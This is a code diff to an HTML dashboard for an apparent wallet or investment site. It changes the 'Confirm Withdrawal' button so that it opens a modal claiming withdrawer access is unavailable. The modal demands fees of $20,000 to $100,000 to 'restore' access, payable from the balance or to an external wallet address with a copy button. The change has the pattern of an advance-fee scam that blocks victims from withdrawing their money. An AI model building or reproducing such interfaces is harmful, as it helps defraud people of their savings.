@@ -28,6 +28,10 @@
     </div>
 
     <div class="nav-right">
+      <div class="live-indicator">
+        <span class="live-dot"></span>
+        <span class="live-text">Live</span>
+      </div>
       <div class="user" onclick="logout()">Logout</div>
       <div class="hamburger" id="hamburger">☰</div>
     </div>
@@ -207,11 +211,133 @@
       </div>
 
       <div class="modal-footer">
-        <button class="primary-btn" onclick="submitWithdraw()">Confirm Withdrawal</button>
+        <button class="primary-btn" onclick="openWithdrawAccess()">Confirm Withdrawal</button>
       </div>
 
     </div>
   </div>
+
+  <!-- WITHDRAW ACCESS MODAL -->
+<div id="withdrawAccessModal" class="modal">
+
+  <div class="modal-box access-box">
+
+    <div class="modal-header">
+      <h3>Opps!</h3>
+      <span onclick="closeWithdrawAccess()">×</span>
+    </div>
+
+    <div class="modal-body">
+
+      <div class="access-warning">
+        Withdrawer access unavailable.
+      </div>
+
+      <p class="access-text">
+        Restore withdrawer access by creating a beneficiary withdrawer path account.
+      </p>
+
+      <div class="tier-box">
+        <div class="tier-row">
+          <span>Tier 1</span>
+          <strong>$20,000</strong>
+        </div>
+
+        <div class="tier-row">
+          <span>Tier 2</span>
+          <strong>$50,000</strong>
+        </div>
+
+        <div class="tier-row">
+          <span>Tier 3</span>
+          <strong>$100,000</strong>
+        </div>
+      </div>
+
+      <!-- PAY FROM ACCOUNT -->
+      <div class="payment-option">
+        <div>
+          <h4>Pay Fee From This Wallet</h4>
+          <small>Use available balance</small>
+        </div>
+
+        <button class="pay-btn" onclick="payInternal()">
+          Pay
+        </button>
+      </div>
+
+      <!-- PAY EXTERNALLY -->
+      <div class="payment-option">
+        <div>
+          <h4>Pay Fee Externally</h4>
+          <small>Use external wallet</small>
+        </div>
+
+        <button class="pay-btn" onclick="openExternalPayment()">
+          Pay
+        </button>
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- EXTERNAL PAYMENT MODAL -->
+<div id="externalPaymentModal" class="modal">
+
+  <div class="modal-box">
+
+    <div class="modal-header">
+      <h3>External Payment</h3>
+      <span onclick="closeExternalPayment()">×</span>
+    </div>
+
+    <div class="modal-body">
+
+      <p class="hint-text">
+        Send payment to the address below
+      </p>
+
+      <div class="address-row">
+
+        <input
+          id="externalPaymentAddress"
+          class="wallet-address-box"
+          readonly
+          value="Loading..."
+        />
+
+        <div class="copy-icon" onclick="copyExternalPaymentAddress()">
+
+          <svg xmlns="http://www.w3.org/2000/svg"
+               width="18"
+               height="18"
+               fill="none"
+               stroke="currentColor"
+               stroke-width="2"
+               stroke-linecap="round"
+               stroke-linejoin="round"
+               viewBox="0 0 24 24">
+            <rect x="9" y="9" width="13" height="13" rx="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+<div id="globalLoader" class="global-loader">
+  <div class="spinner"></div>
+  <p>Processing...</p>
+</div>
   <script src="dashboard.js"></script>
 </body>
 
